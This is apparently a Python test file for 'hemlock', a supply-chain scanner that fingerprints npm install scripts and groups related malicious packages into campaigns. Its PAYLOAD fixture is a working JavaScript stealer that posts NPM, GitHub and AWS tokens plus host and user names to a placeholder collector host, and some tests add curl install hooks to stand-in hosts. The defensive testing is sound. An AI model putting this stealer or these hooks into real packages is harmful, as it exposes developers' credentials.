"""Correlation: the fingerprinting, the guards, and the escalation.

Most of this file is about the guards rather than about detection. Finding
that two files are the same is the easy half; the half that decides whether
this feature is usable is whether it stays quiet about the thirty ways an
honest project has two packages with something in common.
"""

from __future__ import annotations

import json
import os

import pytest

from hemlock import campaign as camp
from hemlock import fingerprint as fp
from hemlock import report as fmt
from hemlock import scan
from hemlock.model import Package
from hemlock.policy import Policy, PolicyError

HERE = os.path.dirname(__file__)
FIXTURE = os.path.join(HERE, "..", "examples", "compromised-app")


PAYLOAD = """
const os = require('os');
const https = require('https');
const TARGET = 'https://collector.example.invalid/ingest';
const KEYS = ['NPM_TOKEN', 'GITHUB_TOKEN', 'AWS_SECRET_ACCESS_KEY'];

function harvest() {
  const out = {};
  for (const key of KEYS) {
    const value = process.env[key];
    if (value && value.length > 2) {
      out[key] = value;
    }
  }
  out.host = os.hostname();
  out.user = os.userInfo().username;
  return out;
}

function send(body) {
  const data = Buffer.from(JSON.stringify(body));
  const req = https.request(TARGET, { method: 'POST' });
  req.on('error', function (e) { return null; });
  req.write(data);
  req.end();
}

try {
  send(harvest());
} catch (e) {
  // quiet
}
"""


def rename(src: str, salt: str) -> str:
    for i, name in enumerate(["TARGET", "KEYS", "harvest", "send", "out", "key",
                              "value", "body", "data", "req"]):
        src = src.replace(name, f"{salt}{i}")
    return src


# --------------------------------------------------------------------------
# fingerprinting
# --------------------------------------------------------------------------


def test_renaming_every_identifier_changes_nothing():
    a, b = fp.sketch(PAYLOAD), fp.sketch(rename(PAYLOAD, "zq"))
    assert a.prints and fp.similarity(a, b) == 1.0


def test_changing_the_strings_changes_nothing():
    """The address a payload reports to is the first thing an attacker varies
    per package, so it must not be part of what identifies the payload."""
    other = PAYLOAD.replace("collector.example.invalid", "somewhere-else.example.invalid")
    assert fp.similarity(fp.sketch(PAYLOAD), fp.sketch(other)) == 1.0


def test_minifying_changes_nothing():
    stripped = [ln for ln in PAYLOAD.splitlines() if not ln.strip().startswith("//")]
    mini = " ".join(" ".join(stripped).split())
    assert fp.similarity(fp.sketch(PAYLOAD), fp.sketch(mini)) == 1.0


def test_unrelated_code_shares_nothing():
    other = "\n".join(f"export function f{i}(x) {{ return x.map(y => y + {i}); }}"
                      for i in range(80))
    assert fp.similarity(fp.sketch(PAYLOAD), fp.sketch(other)) == 0.0


def test_a_payload_pasted_into_a_real_file_is_still_found():
    """Jaccard reads this as barely related because the sizes differ, which is
    why containment rather than similarity is what forms a link."""
    host = "\n".join(f"export function f{i}(x) {{ return x.map(y => y + {i}); }}"
                     for i in range(80))
    a, b = fp.sketch(PAYLOAD), fp.sketch(host + "\n" + PAYLOAD)
    assert fp.containment(a, b) == 1.0
    assert fp.shared_run(a, b) >= camp.SAME_CODE_FLOOR
    assert fp.similarity(a, b) < 1.0


def test_the_same_token_run_hashes_the_same_wherever_it_sits():
    """The winnowing guarantee rests on this. A rolling hash whose halves use
    different moduli quietly breaks it while still looking deterministic."""
    tokens = fp.normalize(PAYLOAD)
    prefix = fp.normalize("const a = 1; const b = 2; function q(w) { return w; }")
    tail = fp._hashes(prefix + tokens)[-(len(tokens) - fp.K + 1):]
    assert tail == fp._hashes(tokens)


def test_small_files_are_not_compared_at_all():
    assert not fp.sketch("const a = 1;\nmodule.exports = a;\n")


def test_division_is_not_mistaken_for_a_regular_expression():
    """Getting this wrong swallows the rest of the file into a string literal,
    and every file after the mistake looks identical to every other."""
    tokens = fp.normalize("const r = a / b / c; const t = 2;")
    assert tokens.count("/") == 2 and tokens[-2:] == ["num", ";"]
    assert fp.normalize("const r = /ab[/]c/g.test(s);").count("/") == 0


def test_nested_template_literals_do_not_run_off_the_end():
    tokens = fp.normalize("const a = `x${ `y${z}` }w`; const after = 1;")
    assert "const" in tokens[-4:] or "after" not in tokens
    assert tokens[-1] == ";"


def test_python_is_tokenized_too():
    a = fp.normalize("def f(a):\n    # note\n    return a + 1\n", "py")
    b = fp.normalize("def other(zzz):\n    return zzz + 2\n", "py")
    assert a == b == ["def", "id", "(", "id", ")", ":", "return", "id", "+", "num"]


def test_labels_are_stable_across_processes():
    """Fingerprints end up in JSON and get compared against a later run, so
    they cannot depend on a per-process hash seed."""
    assert fp.sketch(PAYLOAD).label == fp.sketch(PAYLOAD).label
    assert fp.hash_token("postinstall") == fp.hash_token("postinstall")


# --------------------------------------------------------------------------
# building packages on disk
# --------------------------------------------------------------------------


def make(tmp_path, name, body=PAYLOAD, hook="node ./setup.js", **meta) -> Package:
    d = tmp_path / name.replace("/", "__")
    d.mkdir(parents=True, exist_ok=True)
    (d / "setup.js").write_text(body)
    return Package(ecosystem="npm", name=name, version="1.0.0", direct=True,
                   scripts={"postinstall": hook} if hook else {},
                   source_dir=str(d), meta=dict(meta))


# --------------------------------------------------------------------------
# what should be found
# --------------------------------------------------------------------------


def test_repacked_copies_land_in_one_campaign(tmp_path):
    pkgs = [make(tmp_path, "alpha"),
            make(tmp_path, "beta", rename(PAYLOAD, "q")),
            make(tmp_path, "gamma", " ".join(rename(PAYLOAD, "w").split()))]
    found = camp.correlate(pkgs)
    assert len(found) == 1
    assert {p.name for p in found[0].members} == {"alpha", "beta", "gamma"}
    assert "payload" in found[0].kinds and found[0].behavioral


def test_transitive_links_make_one_campaign_not_two(tmp_path):
    """A shares a payload with B, B shares an endpoint with C. That is one
    operation, and reporting it as two halves loses the shape of it."""
    other = PAYLOAD.replace("harvest", "gather").replace("const os", "const oss")
    pkgs = [make(tmp_path, "a"),
            make(tmp_path, "b"),
            make(tmp_path, "c", body=other * 3, hook="curl https://collector.example.invalid/x")]
    found = camp.correlate(pkgs)
    assert len(found) == 1
    assert {p.name for p in found[0].members} == {"a", "b", "c"}


def test_the_fixture_reports_one_campaign():
    report = scan.run(FIXTURE, Policy())
    assert len(report.campaigns) == 1
    assert len(report.campaigns[0].members) == 4
    assert {ln.kind for ln in report.campaigns[0].links} == {"payload", "endpoint"}


def test_varying_the_endpoint_does_not_escape_the_payload_link():
    """One fixture package changed its host and its formatting. It is still in
    the campaign, on the payload link alone."""
    report = scan.run(FIXTURE, Policy())
    links = {ln.kind: ln for ln in report.campaigns[0].links}
    key = "npm:dom-serialize-fast@2.1.4"
    assert key in links["payload"].members
    assert key not in links["endpoint"].members


# --------------------------------------------------------------------------
# what should not be found -- the guards
# --------------------------------------------------------------------------


def test_a_clean_package_is_never_pulled_into_a_campaign():
    report = scan.run(FIXTURE, Policy())
    caught = {p.name for c in report.campaigns for p in c.members}
    assert "express" not in caught


def test_one_scope_shipping_one_helper_is_not_a_campaign(tmp_path):
    """A monorepo publishes the same code across its own packages all day.
    Without this guard every monorepo in the tree lights up."""
    pkgs = [make(tmp_path, "@acme/one"), make(tmp_path, "@acme/two"),
            make(tmp_path, "@acme/three")]
    assert camp.correlate(pkgs) == []


def test_one_repository_shipping_two_packages_is_not_a_campaign(tmp_path):
    repo = {"url": "git+https://github.com/acme/tools.git"}
    pkgs = [make(tmp_path, "tools-core", repository=repo),
            make(tmp_path, "tools-cli", repository=repo)]
    assert camp.correlate(pkgs) == []


def test_a_scoped_monorepo_still_links_to_an_outsider(tmp_path):
    """Collapsing an owner to one representative rather than dropping the
    group keeps the case that matters: the outsider that joined them."""
    pkgs = [make(tmp_path, "@acme/one"), make(tmp_path, "@acme/two"),
            make(tmp_path, "stranger", rename(PAYLOAD, "v"))]
    found = camp.correlate(pkgs)
    assert len(found) == 1
    names = {p.name for p in found[0].members}
    assert "stranger" in names and len(names & {"@acme/one", "@acme/two"}) == 1
    assert len(names) == 2


def test_everybodys_hosts_are_not_a_relationship(tmp_path):
    pkgs = [make(tmp_path, "one", body="// nothing\n", hook="curl https://registry.npmjs.org/x"),
            make(tmp_path, "two", body="// nothing\n", hook="curl https://github.com/y")]
    assert camp.correlate(pkgs) == []


def test_a_subdomain_of_a_common_host_is_still_common(tmp_path):
    pkgs = [make(tmp_path, "one", body="// n\n", hook="curl https://a.objects.githubusercontent.com/x"),
            make(tmp_path, "two", body="// n\n", hook="curl https://a.objects.githubusercontent.com/y")]
    assert camp.correlate(pkgs) == []


def test_a_package_fetching_from_its_own_homepage_links_to_nobody(tmp_path):
    home = "https://downloads.acme-project.example/bin"
    pkgs = [make(tmp_path, "one", body="// n\n", hook=f"curl {home}/a", homepage=home),
            make(tmp_path, "two", body="// n\n", hook=f"curl {home}/b", homepage=home)]
    assert camp.correlate(pkgs) == []


def test_a_host_reached_by_a_crowd_is_an_idiom(tmp_path):
    """A popular endpoint really is shared by hundreds of unrelated packages."""
    pkgs = [make(tmp_path, f"p{i}", body=f"// {i}\n",
                 hook=f"curl https://popular.example.invalid/{i}")
            for i in range(camp.CROWD + 5)]
    assert camp.correlate(pkgs) == []


def test_a_payload_shared_by_a_crowd_is_the_worst_case_not_the_dullest(tmp_path):
    """The crowd cap once applied to payloads too, and the effect was that a
    scan of a tree carrying one identical install script across hundreds of
    packages reported nothing: the largest possible compromise read as the
    most ordinary idiom. Size is not evidence of innocence here."""
    n = camp.CROWD * 3
    pkgs = [make(tmp_path, f"p{i}", rename(PAYLOAD, f"s{i}")) for i in range(n)]
    found = camp.correlate(pkgs)
    assert len(found) == 1 and len(found[0].members) == n
    assert "separate owner" in found[0].links_of("payload")[0].detail


def test_an_established_publisher_is_not_an_indicator(tmp_path):
    """HEM803 is about accounts that are new to the packages they published,
    not about accounts that publish."""
    steady = {"publisher": "maintainer", "prior_publishers": ["maintainer"]}
    pkgs = [make(tmp_path, "one", body="// n\n", hook="", **steady),
            make(tmp_path, "two", body="// n\n", hook="", **steady)]
    assert camp.correlate(pkgs) == []


def test_one_new_account_across_packages_is_an_indicator(tmp_path):
    fresh = {"publisher": "newcomer", "prior_publishers": ["someone-else"]}
    pkgs = [make(tmp_path, "one", body="// n\n", hook="", **fresh),
            make(tmp_path, "two", body="// n\n", hook="", **fresh)]
    found = camp.correlate(pkgs)
    assert len(found) == 1 and found[0].kinds == ["publisher"]
    # An account is a question, not a payload, and the report has to say so.
    assert not found[0].behavioral


def test_timing_alone_never_makes_a_campaign(tmp_path):
    """Half a dependency tree moves in the same week for boring reasons."""
    from datetime import UTC, datetime
    when = datetime(2026, 3, 1, tzinfo=UTC)
    pkgs = [make(tmp_path, "one", body="// n\n", hook="", published_at=when),
            make(tmp_path, "two", body="// n\n", hook="", published_at=when)]
    assert camp.correlate(pkgs) == []


def test_timing_corroborates_a_link_that_already_exists(tmp_path):
    from datetime import UTC, datetime
    when = datetime(2026, 3, 1, tzinfo=UTC)
    pkgs = [make(tmp_path, "one", published_at=when),
            make(tmp_path, "two", rename(PAYLOAD, "y"), published_at=when)]
    assert "within the same hour" in camp.correlate(pkgs)[0].burst


def test_an_install_hook_cannot_read_outside_its_own_package(tmp_path):
    """A hook is free to name ../../../etc/passwd. Following that would read a
    file the scan has no business opening and blame a package for it."""
    outside = tmp_path / "outside.js"
    outside.write_text(PAYLOAD)
    pkg = make(tmp_path, "sneaky", hook="node ../outside.js")
    reachable = camp.install_reachable(pkg)
    assert all(os.path.realpath(str(outside)) != p for p in reachable)


def test_a_symlinked_payload_is_not_followed(tmp_path):
    real = tmp_path / "real.js"
    real.write_text(PAYLOAD)
    pkg = make(tmp_path, "linky", hook="node ./link.js")
    link = os.path.join(pkg.source_dir, "link.js")
    os.symlink(real, link)
    assert link not in camp.install_reachable(pkg)


def test_code_that_no_install_would_run_is_not_fingerprinted(tmp_path):
    """Vendored copies under dist/ are shared by thousands of packages and
    mean nothing, so only install-reachable code is compared."""
    for name in ("one", "two"):
        d = tmp_path / name
        (d / "dist").mkdir(parents=True)
        (d / "dist" / "vendor.js").write_text(PAYLOAD)
        (d / "package.json").write_text("{}")
    pkgs = [Package("npm", n, version="1.0.0", source_dir=str(tmp_path / n)) for n in ("one", "two")]
    assert camp.correlate(pkgs) == []


# --------------------------------------------------------------------------
# what it does to the score
# --------------------------------------------------------------------------


def test_correlation_turns_four_low_findings_into_four_critical_ones():
    """The whole claim of the feature, as a number."""
    names = {"fs-metadata", "swc-loader-utils", "nuxt-icon-set", "dom-serialize-fast"}

    alone = scan.run(FIXTURE, Policy(correlate=False))
    apart = {v.package.name: v for v in alone.verdicts if v.package.name in names}
    assert {v.severity for v in apart.values()} == {"low"}

    together = scan.run(FIXTURE, Policy())
    joined = {v.package.name: v for v in together.verdicts if v.package.name in names}
    assert {v.severity for v in joined.values()} == {"critical"}
    assert all(v.score > apart[n].score for n, v in joined.items())


def test_the_escalation_shows_its_working():
    """A number that goes from 18 to 100 has to say why on the same screen."""
    report = scan.run(FIXTURE, Policy())
    v = next(v for v in report.verdicts if v.package.name == "fs-metadata")
    assert "campaign" in v.parts and v.multiplier > 1.0
    assert "campaign" in fmt.arithmetic(v)


def test_a_correlated_finding_suppresses_like_any_other():
    """Reporting through the ordinary rule registry is what buys this, and it
    is the reason the feature is not a second scoring system."""
    from hemlock.policy import Ignore
    policy = Policy(ignores=[Ignore(rule="HEM801", package="*", reason="reviewed")])
    report = scan.run(FIXTURE, policy)
    fired = {f.rule.id for v in report.verdicts for f in v.findings}
    assert "HEM801" not in fired and report.suppressed >= 4


def test_turning_correlation_off_leaves_everything_else_alone():
    on, off = scan.run(FIXTURE, Policy()), scan.run(FIXTURE, Policy(correlate=False))
    assert off.campaigns == []
    assert not any(f.rule.category == "campaign" for v in off.verdicts for f in v.findings)
    # Every package outside the campaign scores exactly the same either way.
    inside = {p.name for c in on.campaigns for p in c.members}

    def others(r):
        return {v.package.name: v.score for v in r.verdicts if v.package.name not in inside}

    assert others(on) == others(off) and others(on)


def test_correlate_is_configurable(tmp_path):
    (tmp_path / ".hemlock.toml").write_text("correlate = false\n")
    from hemlock import policy as policy_mod
    assert policy_mod.load(str(tmp_path)).correlate is False
    (tmp_path / ".hemlock.toml").write_text("correlate = 'no'\n")
    with pytest.raises(PolicyError):
        policy_mod.load(str(tmp_path))


# --------------------------------------------------------------------------
# how it is reported
# --------------------------------------------------------------------------


def test_the_campaign_is_stated_once_above_the_list():
    from hemlock.ui import Ink
    text = fmt.terminal(scan.run(FIXTURE, Policy()), Ink(0))
    assert "correlated" in text
    head, _, rest = text.partition("C1")
    assert "fs-metadata 2.1.4" in rest.split("100")[0]
    # and the sentence that says what the correlation bought
    assert "Read one at a time" in text


def test_json_carries_the_campaign_as_its_own_object():
    doc = json.loads(fmt.as_json(scan.run(FIXTURE, Policy())))
    assert len(doc["campaigns"]) == 1
    incident = doc["campaigns"][0]
    assert len(incident["members"]) == 4
    assert {ln["kind"] for ln in incident["links"]} == {"payload", "endpoint"}


def test_markdown_puts_the_campaign_above_the_table():
    text = fmt.as_markdown(scan.run(FIXTURE, Policy()))
    assert text.index("### C1") < text.index("| Package |")


def test_sarif_still_validates_with_the_new_rules():
    doc = json.loads(fmt.as_sarif(scan.run(FIXTURE, Policy())))
    ids = {r["id"] for r in doc["runs"][0]["tool"]["driver"]["rules"]}
    assert "HEM801" in ids
    assert all(r["ruleId"] for r in doc["runs"][0]["results"])


def test_every_campaign_rule_has_a_remedy_and_an_explanation():
    from hemlock.model import RULES
    for rid in ("HEM801", "HEM802", "HEM803"):
        rule = RULES[rid]
        assert rule.category == "campaign" and rule.fix and len(rule.explain) > 200


def test_a_single_package_cannot_be_a_campaign(tmp_path):
    assert camp.correlate([make(tmp_path, "lonely")]) == []
    assert camp.correlate([]) == []


# --------------------------------------------------------------------------
# the pull request case
# --------------------------------------------------------------------------


def _pr_adding_the_campaign(tmp_path):
    """A branch that adds the four campaign packages to an existing lockfile.

    This is the surface the feature is actually used through: a CI job runs
    `hemlock diff` against the base branch, not a full scan.
    """
    import shutil

    from hemlock import diff

    app = tmp_path / "app"
    shutil.copytree(FIXTURE, app)
    lock = json.loads((app / "package-lock.json").read_text())

    base = json.loads(json.dumps(lock))
    for name in ("fs-metadata", "swc-loader-utils", "nuxt-icon-set", "dom-serialize-fast"):
        base["packages"].pop(f"node_modules/{name}", None)
        base["packages"][""]["dependencies"].pop(name, None)
    old = tmp_path / "old"
    old.mkdir()
    (old / "package-lock.json").write_text(json.dumps(base, indent=2))

    return diff.run(diff.read_manifest(str(old / "package-lock.json"), str(tmp_path)),
                    diff.read_manifest(str(app / "package-lock.json"), str(app)),
                    Policy(), root=str(app), labels=("main", "PR"))


def test_a_pull_request_adding_the_campaign_is_caught(tmp_path):
    report = _pr_adding_the_campaign(tmp_path)
    assert len(report.campaigns) == 1
    assert {v.severity for v in report.flagged} == {"critical"}


def test_the_diff_view_states_the_campaign_once_as_well(tmp_path):
    from hemlock.ui import Ink
    text = fmt.terminal_diff(_pr_adding_the_campaign(tmp_path), Ink(0))
    assert text.index("correlated") < text.index("fs-metadata 2.1.4")
    assert "campaign 73 + install 18" in text


def test_the_diff_json_carries_campaigns_too(tmp_path):
    doc = json.loads(fmt.as_json_diff(_pr_adding_the_campaign(tmp_path)))
    assert len(doc["campaigns"]) == 1


# --------------------------------------------------------------------------
# degrading rather than breaking
# --------------------------------------------------------------------------


def test_the_matrix_renders_without_unicode():
    from hemlock.ui import ASCII, Ink
    body = "\n".join(fmt._campaigns_block(scan.run(FIXTURE, Policy()), Ink(0), ASCII, 78))
    assert "*" in body and "●" not in body


def test_a_binary_file_behind_a_hook_is_not_a_payload(tmp_path):
    for name in ("a", "b"):
        d = tmp_path / name
        d.mkdir()
        (d / "setup.js").write_bytes(b"\x00\xff\xfe" * 5000)
    pkgs = [Package("npm", n, version="1.0", scripts={"postinstall": "node ./setup.js"},
                    source_dir=str(tmp_path / n)) for n in ("a", "b")]
    assert camp.correlate(pkgs) == []


def test_truncated_source_does_not_hang_or_throw():
    """Half a template literal, an unclosed regex and an unterminated string
    are all things a scanner meets, and none of them is a reason to stop."""
    cases = [("const a = `unterminated ${ x", "js"),
             ("s = " + "'" * 3 + "oops", "py"),
             ("const r = /abc", "js"),
             ("/* never closed", "js")]
    for text, lang in cases:
        assert isinstance(fp.normalize(text, lang), list)


def test_packages_with_no_version_still_report(tmp_path):
    """`check` hands over bare names, which have no coord to look a score up
    by. The section has to render anyway rather than raise."""
    from hemlock.ui import ASCII, Ink
    pkgs = [Package("npm", n, scripts={"postinstall": "curl https://odd.example.invalid/x"},
                    source_dir=str(tmp_path)) for n in ("a", "b")]
    report = scan.Report(root=".", packages=pkgs)
    scan.run_rules(report, Policy(), False, pkgs)
    assert [m.coord for m in report.campaigns[0].members] == ["a", "b"]
    assert fmt._campaigns_block(report, Ink(0), ASCII, 78)


def test_a_tree_with_nothing_in_common_reports_no_campaign(tmp_path):
    bodies = ["\n".join(f"export function f{i}_{j}(x) {{ return x * {j} + {i}; }}"
                        for j in range(40)) for i in range(6)]
    pkgs = [make(tmp_path, f"p{i}", body) for i, body in enumerate(bodies)]
    assert camp.correlate(pkgs) == []


def test_generated_boilerplate_has_no_shape_to_match_on(tmp_path):
    """Files that are one pattern repeated normalize to the same short stream
    however different their contents are, so every barrel file in npm would
    match every other one. Length does not separate these from real code;
    fingerprint variety does."""
    shapes = {
        "barrel": "\n".join(f"export {{ thing{j} }} from './thing{j}';" for j in range(120)),
        "constants": "\n".join(f"exports.NAME_{j} = 'value-{j}';" for j in range(150)),
        "stubs": "\n".join(f"export function f_{j}(x) {{ return x * {j} + 1; }}" for j in range(40)),
    }
    for name, body in shapes.items():
        assert not fp.sketch(body), f"{name} should not be comparable"
        assert len(fp.normalize(body)) > fp.MIN_TOKENS, f"{name} is long enough to reach the check"

    pkgs = [make(tmp_path, f"p{i}", body) for i, body in enumerate(shapes.values())]
    assert camp.correlate(pkgs) == []


def test_real_source_keeps_plenty_of_shape():
    """The variety floor has to leave ordinary code far above it, or it is
    just a second length limit."""
    assert len(fp.sketch(PAYLOAD).prints) > fp.MIN_PRINTS * 2


def test_an_accepted_campaign_stops_being_reported(tmp_path):
    """A baseline strips the findings and rescores what is left. Leaving the
    campaign block printing over a list with nothing in it tells somebody
    their accepted finding is back when it is not."""
    import shutil

    from hemlock import baseline as bl

    app = tmp_path / "app"
    shutil.copytree(FIXTURE, app)

    from hemlock.ui import ASCII, Ink

    first = scan.run(str(app), Policy())
    assert fmt.live_campaigns(first)
    bl.write(first, str(app))

    after = scan.run(str(app), Policy())
    bl.apply(after, bl.load(str(app)))
    assert after.baselined
    assert fmt.live_campaigns(after) == []
    assert not fmt._campaigns_block(after, Ink(0), ASCII, 78)
    assert json.loads(fmt.as_json(after))["campaigns"] == []


def test_a_suppressed_campaign_rule_stops_being_reported():
    from hemlock.policy import Ignore
    policy = Policy(ignores=[Ignore(rule="HEM8*", package="*", reason="reviewed")])
    report = scan.run(FIXTURE, policy)
    assert report.campaigns and fmt.live_campaigns(report) == []


def test_a_scan_with_nothing_installed_says_so(tmp_path):
    """Finding no campaigns because there was no code to compare looks exactly
    like comparing everything and finding nothing. The second is a much
    stronger claim than this run is entitled to make."""
    import shutil

    for name in ("package.json", "package-lock.json"):
        shutil.copy(os.path.join(FIXTURE, name), tmp_path / name)

    report = scan.run(str(tmp_path), Policy())
    assert report.campaigns == []
    assert any("nothing to read" in w for w in report.warnings)


def test_an_installed_tree_does_not_get_the_warning():
    report = scan.run(FIXTURE, Policy())
    assert not any("nothing to read" in w for w in report.warnings)


def test_check_does_not_repeat_itself(tmp_path):
    """A bare name never has source behind it, and `check` already says that
    at the top of its report in more detail than this warning would."""
    report = scan.check([scan.parse_spec("chalk@5.6.1")], Policy())
    assert not any("nothing to read" in w for w in report.warnings)
    assert report.scope
